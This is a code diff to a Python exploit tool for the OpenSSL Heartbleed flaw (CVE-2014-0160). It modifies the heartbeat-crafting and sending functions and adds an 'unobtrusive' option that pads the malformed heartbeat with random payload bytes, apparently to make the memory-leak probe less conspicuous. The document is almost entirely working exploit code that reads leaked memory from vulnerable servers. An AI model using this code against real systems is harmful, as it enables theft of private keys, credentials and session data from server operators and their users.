@@ -3,7 +3,7 @@ OpenSSL Heartbleed (CVE-2014-0160) library.
 Author: Einar Otto Stangvik / @einaros / https://hacking.ventures
 Environment: Python 3
 """
-import sys, socket, time, struct, select, re, binascii
+import sys, socket, time, struct, select, re, binascii, random
 import ciphers
 
 CLIENTHELLO_BASE_LENGTH = 0x74
@@ -95,10 +95,14 @@ def recv_tlsrecord(s, verbose, timeout):
     print('Received message: type = %d, ver = %04x, length = %d' % (typ, ver, len(pay)), file=sys.stderr)
   return typ, ver, pay
 
-def make_heartbeat(version, length):
+def make_heartbeat(version, heartbeat_length, payload_length=0):
+  record_length = struct.pack('>H', 3 + payload_length)
   version = struct.pack('>B', version)
-  length = struct.pack('>H', length)
-  return b'\x18\x03' + version + b'\x00\x03\x01' + length
+  heartbeat_length = struct.pack('>H', heartbeat_length)
+  payload = b''
+  if payload_length > 0:
+    payload = bytes(random.getrandbits(8) for i in range(payload_length))
+  return b'\x18\x03' + version + record_length + b'\x01' + heartbeat_length + payload
 
 def loopsend_hb(s, version, length, loops, verbose=False):
   length = min(MAX_LENGTH, length)
@@ -114,25 +118,27 @@ def loopsend_hb(s, version, length, loops, verbose=False):
     pass
   return len(all_data) > 24, all_data
 
-def send_hb(s, version, length, timeout):
-  length = min(MAX_LENGTH, length)
-  expected = 24 + length
-  hb = make_heartbeat(version, length)
+def send_hb(s, version, length, timeout, unobtrusive):
+  heartbeat_length = min(MAX_LENGTH, length)
+  payload_length = 0
+  if unobtrusive:
+    payload_length = heartbeat_length - 1
+  hb = make_heartbeat(version, heartbeat_length, payload_length)
   all_data = b''
   try:
     s.send(hb)
-    data = recv_len(s, expected, timeout)
+    data = recv_len(s, 65540, timeout) # expect at most a full tls record + header
     if data is not None and len(data) > 0:
       all_data += data
   except Exception:
     pass
-  return len(all_data) > 24, all_data
+  return len(all_data) > 24 + payload_length, all_data
 
 def blockbytes(blocks):
   return bytes([i for s in blocks for i in s])
 
 class Bleeder(object):
-  def __init__(self, length, ip, port, starttls=False, loops=1, verbose=False, timeout=2.5, smtp_hostname=None):
+  def __init__(self, length, ip, port, starttls=False, loops=1, verbose=False, timeout=2.5, unobtrusive=False, smtp_hostname=None):
     self.length = length
     self.ip = ip
     self.port = port
@@ -142,6 +148,7 @@ class Bleeder(object):
     self.timeout = timeout
     if smtp_hostname is None:
       smtp_hostname = 'starttlstest'
+    self.unobtrusive = unobtrusive
     self.smtp_hostname = smtp_hostname
     self.cipher = None
     self.bytes_received = 0
@@ -192,7 +199,7 @@ class Bleeder(object):
         if typ == 22 and pay[0] == 0x0E:
           break
       if self.loops <= 1:
-        vulnerable,data = send_hb(s, ver&0x00FF, self.length, self.timeout)
+        vulnerable,data = send_hb(s, ver&0x00FF, self.length, self.timeout, self.unobtrusive)
       else:
         vulnerable,data = loopsend_hb(s, ver&0x00FF, self.length, self.loops, verbose=self.verbose)
       if vulnerable:
